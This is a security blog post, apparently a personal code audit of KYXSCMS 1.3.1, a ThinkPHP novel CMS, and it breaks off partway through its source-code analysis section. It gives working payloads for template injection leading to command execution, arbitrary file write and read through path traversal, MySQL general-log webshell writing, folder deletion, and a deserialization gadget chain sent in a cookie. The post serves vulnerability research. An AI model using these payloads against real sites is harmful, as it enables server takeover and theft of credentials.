@@ -1,0 +1,718 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="spaceman">
+    
+    
+    
+    
+    
+    
+    <title>狂雨CMS1.3.1代码审计 | spaceman&#39;blog</title>
+    <link href="https://spaceman-911.gitee.io" rel="prefetch" />
+
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<link rel="stylesheet" href="/css/aos.css">
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/js/jquery.min.js"></script>
+
+    
+<script src="/js/bootstrap.min.js"></script>
+
+    
+<script src="/js/aos.js"></script>
+
+    
+<script src="/js/highslide/highslide-full.min.js"></script>
+
+    
+<link rel="stylesheet" href="/js/highslide/highslide.css">
+
+    <style type="text/css">
+        @media (max-width: 768px) {
+            body {
+                background-color: #f0f0f0;
+                background: url('/imgs/lm1.jpg');
+                background-attachment: fixed;
+            }
+        }
+    </style>
+    
+    <!--<script type="text/javascript">
+      if (document.images) {
+        var avatar = new Image();
+        avatar.src = '/imgs/avatar.jpg'
+        var previews = 'preview1.jpg,preview2.jpg,preview3.jpg,preview4.jpg'.split(',')
+        var previewsPreLoad = []
+        for(var i = 0; i < length; i++) {
+          previewsPreLoad.push(new Image())
+          previewsPreLoad[previewsPreLoad.length - 1].src = '/imgs/preview' + previews[i]
+        }
+      }
+    </script>-->
+<meta name="generator" content="Hexo 5.3.0"></head>
+<body>
+    <!-- 背景轮播图功能 -->
+    <section class="hidden-xs">
+    <ul class="cb-slideshow">
+        <li><span>天若</span></li>
+        <li><span>有情</span></li>
+        <li><span>天亦老</span></li>
+        <li><span>我为</span></li>
+        <li><span>长者</span></li>
+        <li><span>续一秒</span></li>
+    </ul>
+</section>
+    <!-- 欧尼酱功能, 谁用谁知道 -->
+    
+    <header class="navbar navbar-inverse" id="gal-header">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed"
+                    data-toggle="collapse" data-target=".bs-navbar-collapse"
+                    aria-expanded="false">
+                <span class="fa fa-lg fa-reorder"></span>
+            </button>
+            <a href="https://spaceman-911.gitee.io">
+                
+                <style>
+                    #gal-header .navbar-brand {
+                        height: 54px;
+                        line-height: 24px;
+                        font-size: 28px;
+                        opacity: 1;
+                        background-color: rgba(0,0,0,0);
+                        text-shadow: 0 0 5px #fff,0 0 10px #fff,0 0 15px #fff,0 0 20px #228DFF,0 0 35px #228DFF,0 0 40px #228DFF,0 0 50px #228DFF,0 0 75px #228DFF;
+                    }
+                </style>
+                <!-- 这里使用文字(navbar_text or config.title) -->
+                <div class="navbar-brand">spaceman&#39;blog</div>
+                
+            </a>
+        </div>
+        <div class="collapse navbar-collapse bs-navbar-collapse">
+            <ul class="nav navbar-nav" id="menu-gal">
+                
+                
+                <li class="">
+                    <a href="/">
+                        <i class="fa fa-home"></i>首页
+                    </a>
+                </li>
+                
+                
+                
+                <li class="">
+                    <a href="/archives">
+                        <i class="fa fa-archive"></i>归档
+                    </a>
+                </li>
+                
+                
+                
+                
+                <li class="dropdown">
+                    <!-- TODO 添加hover dropdown效果 -->
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                       aria-haspopup="true" aria-expanded="false" data-hover="dropdown">
+                        <i class="fa fa-tags"></i>标签
+                    </a>
+                    <ul class="dropdown-menu">
+                        
+                        
+                        <li>
+                            <a href="/tags/CVE/">CVE</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/MSF/">MSF</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/getshell/">getshell</a>
+                        </li>
+                        
+                        
+                        <li>
+                            <a href="/tags">...</a>
+                        </li>
+                        
+                        
+                    </ul>
+                </li>
+                
+                
+                
+                
+                <li class="">
+                    <a href="/about">
+                        <i class="fa fa-user"></i>关于
+                    </a>
+                </li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</header>
+    <div id="gal-body">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-8 gal-right" id="mainstay">
+                    
+<article class="article well article-body" id="article">
+    <div class="breadcrumb">
+        <i class="fa fa-home"></i>
+        <a href="https://spaceman-911.gitee.io">spaceman&#39;blog</a>
+        >
+        <span>狂雨CMS1.3.1代码审计</span>
+    </div>
+    <!-- 大型设备详细文章 -->
+    <div class="hidden-xs">
+        <div class="title-article">
+            <h1>
+                <a href="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">狂雨CMS1.3.1代码审计</a>
+            </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/PHP/">PHP</a>, 
+                
+                <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                
+            </span>
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2022-05-23
+            </span>
+            
+        </div>
+    </div>
+    <!-- 小型设备详细文章 -->
+    <div class="visible-xs">
+        <center>
+            <div class="title-article">
+                <h4>
+                    <a href="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">狂雨CMS1.3.1代码审计</a>
+                </h4>
+            </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2022-05-23
+            </p>
+            <p>
+                
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/PHP/">PHP</a>, 
+                
+                <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                
+                
+                
+            </p>
+        </center>
+    </div>
+    <div class="content-article">
+        <h2 id="狂雨cms131审计"><a class="markdownIt-Anchor" href="#狂雨cms131审计">#</a> 狂雨 CMS1.3.1 审计</h2>
+<h3 id="简介"><a class="markdownIt-Anchor" href="#简介">#</a> 简介</h3>
+<p>狂雨 cms 是款小说 cms，狂雨小说内容管理系统（简称 KYXSCMS）提供一个轻量级小说网站解决方案，基于 ThinkPHP5.1+MySQL 的技术开发（如果还不了解 TP 框架的小伙伴可以先去了解了解大概的 MVC 模式）。KYXSCMS, 灵活，方便，人性化设计简单易用是最大的特色，是快速架设小说类网站首选，只需 5 分钟即可建立一个海量小说的行业网站，批量采集目标网站数据或使用数据联盟，即可自动采集获取大量数据。内置标签模版，即使不懂代码的前端开发者也可以快速建立一个漂亮的小说网站。</p>
+<h3 id="环境准备"><a class="markdownIt-Anchor" href="#环境准备">#</a> 环境准备</h3>
+<p>cms 下载地址：<a target="_blank" rel="noopener" href="http://bbs.kyxscms.com/?s=ajax/downfile/id/1007">http://bbs.kyxscms.com/?s=ajax/downfile/id/1007</a></p>
+<p>phpstudy pro ：<a target="_blank" rel="noopener" href="https://www.xp.cn/download.html">https://www.xp.cn/download.html</a></p>
+<p>服务器环境：Mysql5.7 + Nginx1.15.11</p>
+<p>伪静态规则：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F; &#123; </span><br><span class="line">if (!-e $request_filename)&#123; </span><br><span class="line">rewrite ^(.*)$ &#x2F;index.php?s&#x3D;$1 last; break; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210420220549852.png" alt="image-20210420220549852"></p>
+<p>配置数据库，按步骤安装环境即可。</p>
+<h3 id="漏洞复现"><a class="markdownIt-Anchor" href="#漏洞复现">#</a> 漏洞复现</h3>
+<p>由于是用 thinkphp 框架开发的，所以以下的一些 MVC 就不细讲了，还不了解这个框架的师傅需要先去了解哈</p>
+<h4 id="文件包含"><a class="markdownIt-Anchor" href="#文件包含">#</a> 文件包含</h4>
+<p>网站 logo 上传图片马</p>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210420221410205.png" alt="image-20210420221410205"></p>
+<p>编辑模板</p>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210420221541150.png" alt="image-20210420221541150"></p>
+<p>添加如下代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;include file&#x3D;&quot;uploads&#x2F;config&#x2F;20210420&#x2F;fa4170cbe1481d36c77a25d3e90f5947.png&quot; &#x2F;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210420225845336.png" alt="image-20210420225845336"></p>
+<p>访问主页成功包含</p>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210420230337002.png" alt="image-20210420230337002"></p>
+<h4 id="命令执行"><a class="markdownIt-Anchor" href="#命令执行">#</a> 命令执行</h4>
+<p>编辑模板</p>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210420221541150.png" alt="image-20210420221541150"></p>
+<p>添加一下内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$Think.get.spaceman|eval&#125;</span><br></pre></td></tr></table></figure>
+<p>保存后，去首页就可以执行命令了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?spaceman&#x3D;system(&#39;dir&#39;);</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210519225025263.png" alt="image-20210519225025263"></p>
+<h4 id="任意文件写入"><a class="markdownIt-Anchor" href="#任意文件写入">#</a> 任意文件写入</h4>
+<p>点击编辑模板，bp 抓包</p>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210420221541150.png" alt="image-20210420221541150"></p>
+<p>将参数修改如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content&#x3D;&lt;?php phpinfo();?&gt;&amp;path&#x3D;public&#x2F;566.php</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210507010150996.png" alt="image-20210507010150996"></p>
+<p>成功 getshell</p>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210506225330346.png" alt="image-20210506225330346"></p>
+<h4 id="目录遍历"><a class="markdownIt-Anchor" href="#目录遍历">#</a> 目录遍历</h4>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210508005449369.png" alt="image-20210508005449369"></p>
+<p>点击编辑的时候抓包，修改参数 path 的值</p>
+<p>原参数</p>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210508005522925.png" alt="image-20210508005522925"></p>
+<p>读取网站根目录上层目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;admin&#x2F;template&#x2F;lists&#x2F;path&#x2F;%252E%252E%252F</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210508005723653.png" alt="image-20210508005723653"></p>
+<p>读取 public 目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;admin&#x2F;template&#x2F;lists&#x2F;path&#x2F;%252E%252Fpublic</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210508005846752.png" alt="image-20210508005846752"></p>
+<h4 id="任意文件读取"><a class="markdownIt-Anchor" href="#任意文件读取">#</a> 任意文件读取</h4>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210507142623482.png" alt="image-20210507142623482"></p>
+<p>点击编辑的时候抓包，修改参数 path 的值</p>
+<p>原参数</p>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210507142908055.png" alt="image-20210507142908055"></p>
+<p>读取 database.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;kycms.com&#x2F;admin&#x2F;template&#x2F;edit&#x2F;path&#x2F;config%252Fdatabase%252Ephp.html</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210507144305081.png" alt="image-20210507144305081"></p>
+<p>例如读取根目录的文件，这里我写了一个 12.txt</p>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210507144718363.png" alt="image-20210507144718363"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;kycms.com&#x2F;admin&#x2F;template&#x2F;edit&#x2F;path&#x2F;%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F12%252Etxt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210507144748973.png" alt="image-20210507144748973"></p>
+<h4 id="sql代码执行"><a class="markdownIt-Anchor" href="#sql代码执行">#</a> sql 代码执行</h4>
+<p>可以执行 sql 语句，因为系统提供了 sql 语句查询，但是需要一句一句运行</p>
+<p>若是 root 权限直接可以开启日志，然后使用日志 getshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set global general_log &#x3D; &quot;ON&quot;;</span><br><span class="line">set global general_log_file&#x3D;&#39;F:&#x2F;MyApplication&#x2F;phpstudy_pro&#x2F;WWW&#x2F;kycms.com&#x2F;public&#x2F;123.php&#39;;</span><br><span class="line">create table spaceman (shell varchar(25));</span><br><span class="line">insert into spaceman (shell) values (&quot;&lt;?php phpinfo(); ?&gt;&quot;);</span><br></pre></td></tr></table></figure>
+<p>使用 select 不记录，123.php 内容如下</p>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210506232354400.png" alt="image-20210506232354400"></p>
+<p>getshell</p>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210506232439784.png" alt="image-20210506232439784"></p>
+<h4 id="任意文件夹删除"><a class="markdownIt-Anchor" href="#任意文件夹删除">#</a> 任意文件夹删除</h4>
+<p>首先在 \template\home 目录下创建一个用来测试删除的目录</p>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210507213539625.png" alt="image-20210507213539625"></p>
+<p>一个文件夹放在 \template 目录下</p>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210507213609148.png" alt="image-20210507213609148"></p>
+<p>接着先看一下数据库中的模板表</p>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210507213652635.png" alt="image-20210507213652635"></p>
+<p>可以看到这个命名和上面模板的目录名字一样</p>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210507213738443.png" alt="image-20210507213738443"></p>
+<p>接着借助后台的 sql 功能给该表添加一下数据，一条一条运行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> ky_template <span class="keyword">values</span>(<span class="string">&#x27;56&#x27;</span>,<span class="string">&#x27;test56&#x27;</span>,<span class="string">&#x27;测试56&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;spaceman&#x27;</span>,<span class="string">&#x27;5.0.6&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;web&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> ky_template <span class="keyword">values</span>(<span class="string">&#x27;899&#x27;</span>,<span class="string">&#x27;../test899&#x27;</span>,<span class="string">&#x27;测试899&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;spaceman&#x27;</span>,<span class="string">&#x27;5.0.6&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;web&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>此时我们就可以看到模板中多出了两个</p>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210507214654316.png" alt="image-20210507214654316"></p>
+<p>当我们点击删除的啥时候，相应的文件夹（就是图中的标识名）就会被删除</p>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210507214808881.png" alt="image-20210507214808881"></p>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210507214824731.png" alt="image-20210507214824731"></p>
+<p>可以看到两个文件夹均已被删除，所以使用 sql 插入时可以指定文件夹即可任意删除</p>
+<h4 id="命令执行2"><a class="markdownIt-Anchor" href="#命令执行2">#</a> 命令执行 2</h4>
+<p>首先需要注册一个普通会员账号，然后登录，构造请求如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /user/Recentread/del?id=<span class="number">1</span>&amp;spaceman[]=whoami HTTP/<span class="number">1.1</span></span><br><span class="line">Host: kycms.com</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">100.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">100.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Cookie: lf___forward__=%2F; lf_user_auth=think%3A%7B%22uid%22%3A%221%22%2C%22username%22%3A%22test%22%7D; lf_user_auth_sign=b5b4192a5245a31f8a0c1c387d6d3894233999bc; lf_user_recommend=1653285240; lf_read_log=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A8%3A%22spaceman%22%3Ba%3A0%3A%7B%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22spaceman%22%3BO%3A13%3A%22think%5CRequest%22%3A3%3A%7Bs%3A7%3A%22%00%2A%00hook%22%3Ba%3A1%3A%7Bs%3A7%3A%22visible%22%3Ba%3A2%3A%7Bi%3A0%3Br%3A7%3Bi%3A1%3Bs%3A6%3A%22isAjax%22%3B%7D%7Ds%3A9%3A%22%00%2A%00filter%22%3Bs%3A6%3A%22system%22%3Bs%3A6%3A%22config%22%3Ba%3A1%3A%7Bs%3A8%3A%22var_ajax%22%3Bs%3A8%3A%22spaceman%22%3B%7D%7D%7D%7D%7D%7D</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20220523135837465.png" alt="image-20220523135837465"></p>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20220523135911819.png" alt="image-20220523135911819"></p>
+<h3 id="漏洞分析"><a class="markdownIt-Anchor" href="#漏洞分析">#</a> 漏洞分析</h3>
+<h4 id="文件包含-2"><a class="markdownIt-Anchor" href="#文件包含-2">#</a> 文件包含</h4>
+<p>主要代码</p>
+<p>edit 方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">application/admin/controller/Template.php</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">edit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$Template</span>=model(<span class="string">&#x27;template&#x27;</span>);</span><br><span class="line">    <span class="variable">$data</span>=<span class="keyword">$this</span>-&gt;request-&gt;post();</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;request-&gt;isPost())&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$Template</span>-&gt;edit(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$res</span>  !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;success(<span class="string">&#x27;模版文件修改成功！&#x27;</span>,url(<span class="string">&#x27;index&#x27;</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="variable">$Template</span>-&gt;getError());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$path</span>=urldecode(<span class="keyword">$this</span>-&gt;request-&gt;param(<span class="string">&#x27;path&#x27;</span>));</span><br><span class="line">        <span class="variable">$info</span>=<span class="variable">$Template</span>-&gt;file_info(<span class="variable">$path</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;assign(<span class="string">&#x27;path&#x27;</span>,<span class="variable">$path</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;assign(<span class="string">&#x27;content&#x27;</span>,<span class="variable">$info</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;assign(<span class="string">&#x27;meta_title&#x27;</span>,<span class="string">&#x27;修改模版文件&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到对 $res 进行了判断，所以跟进 model (‘template’) 中的 edit 方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">application/admin/model/Template.php</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">edit</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> File::put(<span class="variable">$data</span>[<span class="string">&#x27;path&#x27;</span>],<span class="variable">$data</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>跟进 File 类 put 方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">extend/org/File.php</span><br><span class="line"></span><br><span class="line"><span class="built_in">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">put</span>(<span class="params"><span class="variable">$filename</span>,<span class="variable">$content</span>,<span class="variable">$type</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$dir</span>   =  dirname(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">if</span>(!is_dir(<span class="variable">$dir</span>))</span><br><span class="line">        mkdir(<span class="variable">$dir</span>,<span class="number">0755</span>,<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">false</span> === file_put_contents(<span class="variable">$filename</span>,<span class="variable">$content</span>))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \think\<span class="built_in">Exception</span>(<span class="string">&#x27;文件写入错误:&#x27;</span>.<span class="variable">$filename</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">self</span>::<span class="variable">$contents</span>[<span class="variable">$filename</span>]=<span class="variable">$content</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此时到这里已经是完成处理了，直接就是写入，毫无过滤，那么不难发现这里可能还会存在一个任意文件写入的漏洞，因为直接将内容写入，参数也可控</p>
+<h4 id="命令执行-2"><a class="markdownIt-Anchor" href="#命令执行-2">#</a> 命令执行</h4>
+<p>如文件包含的分析，并没有进行什么过滤，所以可以直接使用 thinkphp 模板的变量输出</p>
+<p>模板变量输出参考：<a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp5_1/354071">https://www.kancloud.cn/manual/thinkphp5_1/354071</a></p>
+<h4 id="任意文件写入-2"><a class="markdownIt-Anchor" href="#任意文件写入-2">#</a> 任意文件写入</h4>
+<p>正如文件包含的分析，直接使用 file_put_contents 写入文件，参数可控，本想读取文件的最后导致任意文件写入</p>
+<h4 id="目录遍历-2"><a class="markdownIt-Anchor" href="#目录遍历-2">#</a> 目录遍历</h4>
+<p>主要代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">application/admin/controller/Template.php</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">lists</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$Template</span>=model(<span class="string">&#x27;template&#x27;</span>);</span><br><span class="line">    <span class="variable">$list_info</span>=<span class="variable">$Template</span>-&gt;file_list(urldecode(<span class="variable">$path</span>));</span><br><span class="line">    <span 